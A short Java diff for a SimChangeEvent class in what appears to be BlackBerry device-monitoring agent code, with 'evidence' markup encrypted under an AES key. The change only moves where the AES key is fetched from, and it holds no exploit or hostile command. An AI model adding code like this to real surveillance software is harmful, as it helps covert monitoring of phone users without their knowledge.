@@ -12,6 +12,7 @@ import java.io.IOException;
 
 import blackberry.Device;
 import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Markup;
@@ -49,7 +50,7 @@ public final class SimChangeEvent extends Event {
 
             setDelay(DELAY);
             setPeriod(PERIOD);
-            markup = new Markup(eventType, Keys.getInstance().getAesKey());
+            markup = new Markup(eventType, Encryption.getKeys().getAesKey());
         }
 
     }
